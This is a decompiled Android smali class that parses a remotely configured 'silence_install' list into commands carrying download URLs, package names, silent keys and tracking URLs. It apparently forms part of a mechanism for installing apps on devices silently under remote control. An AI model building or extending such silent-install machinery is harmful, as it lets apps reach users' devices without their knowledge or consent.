.class public Lcow/silence/net/SilenceInstallRequest;
.super Ljava/lang/Object;
.source ""


# static fields
.field public static final APP_ID:Ljava/lang/String; = "1000GBW"

.field public static isDebug:Z = true


# direct methods
.method public static constructor <clinit>()V
    .locals 0

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static request()Ljava/util/List;
    .locals 8
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()",
            "Ljava/util/List<",
            "Lcow/silence/entity/PresetCommand;",
            ">;"
        }
    .end annotation

    const-string v0, "SilenceInstallManager"

    :try_start_0
    const-string v1, "silence_install"

    const-string v2, "[]"

    invoke-static {v1, v2}, Lcom/cow/s/u/RemoteConfig;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    new-instance v2, Ljava/util/ArrayList;

    invoke-direct {v2}, Ljava/util/ArrayList;-><init>()V

    new-instance v3, Lorg/json/JSONArray;

    invoke-direct {v3, v1}, Lorg/json/JSONArray;-><init>(Ljava/lang/String;)V

    const/4 v1, 0x0

    :goto_0
    invoke-virtual {v3}, Lorg/json/JSONArray;->length()I

    move-result v4

    if-ge v1, v4, :cond_0

    invoke-virtual {v3, v1}, Lorg/json/JSONArray;->getJSONObject(I)Lorg/json/JSONObject;

    move-result-object v4

    new-instance v5, Lcow/silence/entity/PresetCommand;

    invoke-direct {v5}, Lcow/silence/entity/PresetCommand;-><init>()V

    const-string v6, "pkgMd5"

    invoke-virtual {v4, v6}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    iput-object v6, v5, Lcow/silence/entity/PresetCommand;->mPkgMd5:Ljava/lang/String;

    const-string v6, "country"

    invoke-virtual {v4, v6}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    iput-object v6, v5, Lcow/silence/entity/PresetCommand;->country:Ljava/lang/String;

    const-string v6, "cmdType"

    invoke-virtual {v4, v6}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;)I

    move-result v6

    iput v6, v5, Lcow/silence/entity/PresetCommand;->cmdType:I

    const-string v6, "activeMoment"

    invoke-virtual {v4, v6}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;)I

    move-result v6

    iput v6, v5, Lcow/silence/entity/PresetCommand;->mActiveMoment:I

    const-string v6, "downloadUrl"

    invoke-virtual {v4, v6}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    iput-object v6, v5, Lcow/silence/entity/PresetCommand;->mDownloadUrl:Ljava/lang/String;

    const-string v6, "active"

    invoke-virtual {v4, v6}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;)I

    move-result v6

    iput v6, v5, Lcow/silence/entity/PresetCommand;->mActive:I

    const-string v6, "description"

    invoke-virtual {v4, v6}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    iput-object v6, v5, Lcow/silence/entity/PresetCommand;->description:Ljava/lang/String;

    const-string v6, "sort"

    invoke-virtual {v4, v6}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;)I

    move-result v6

    iput v6, v5, Lcow/silence/entity/PresetCommand;->mSort:I

    const-string v6, "carrierAppId"

    invoke-virtual {v4, v6}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    iput-object v6, v5, Lcow/silence/entity/PresetCommand;->carrierAppId:Ljava/lang/String;

    const-string v6, "uid"

    invoke-virtual {v4, v6}, Lorg/json/JSONObject;->optLong(Ljava/lang/String;)J

    move-result-wide v6

    iput-wide v6, v5, Lcow/silence/entity/PresetCommand;->mUid:J

    const-string v6, "cmdId"

    invoke-virtual {v4, v6}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    iput-object v6, v5, Lcow/silence/entity/PresetCommand;->cmdId:Ljava/lang/String;

    const-string v6, "pkgName"

    invoke-virtual {v4, v6}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    iput-object v6, v5, Lcow/silence/entity/PresetCommand;->mPkgName:Ljava/lang/String;

    const-string v6, "startTime"

    invoke-virtual {v4, v6}, Lorg/json/JSONObject;->optLong(Ljava/lang/String;)J

    move-result-wide v6

    iput-wide v6, v5, Lcow/silence/entity/PresetCommand;->startTime:J

    const-string v6, "endTime"

    invoke-virtual {v4, v6}, Lorg/json/JSONObject;->optLong(Ljava/lang/String;)J

    move-result-wide v6

    iput-wide v6, v5, Lcow/silence/entity/PresetCommand;->endTime:J

    const-string v6, "networkType"

    invoke-virtual {v4, v6}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;)I

    move-result v6

    int-to-long v6, v6

    iput-wide v6, v5, Lcow/silence/entity/PresetCommand;->mNetworkType:J

    const-string v6, "silentKey"

    invoke-virtual {v4, v6}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    iput-object v6, v5, Lcow/silence/entity/PresetCommand;->mSilentKey:Ljava/lang/String;

    const-string v6, "trackUrl"

    invoke-virtual {v4, v6}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    iput-object v6, v5, Lcow/silence/entity/PresetCommand;->mTrackUrl:Ljava/lang/String;

    const-string v6, "status"

    invoke-virtual {v4, v6}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;)I

    move-result v6

    iput v6, v5, Lcow/silence/entity/PresetCommand;->status:I

    const-string v6, "traffic"

    invoke-virtual {v4, v6}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;)I

    move-result v6

    iput v6, v5, Lcow/silence/entity/PresetCommand;->traffic:I

    const-string v6, "targetVersion"

    invoke-virtual {v4, v6}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;)I

    move-result v6

    iput v6, v5, Lcow/silence/entity/PresetCommand;->targetVersionCode:I

    const-string v6, "versionCode"

    invoke-virtual {v4, v6}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;)I

    move-result v4

    iput v4, v5, Lcow/silence/entity/PresetCommand;->versionCode:I

    invoke-interface {v2, v5}, Ljava/util/List;->add(Ljava/lang/Object;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    add-int/lit8 v1, v1, 0x1

    goto/16 :goto_0

    :cond_0
    return-object v2

    :catch_0
    move-exception v1

    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V

    invoke-virtual {v1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    const/4 v0, 0x0

    return-object v0
.end method
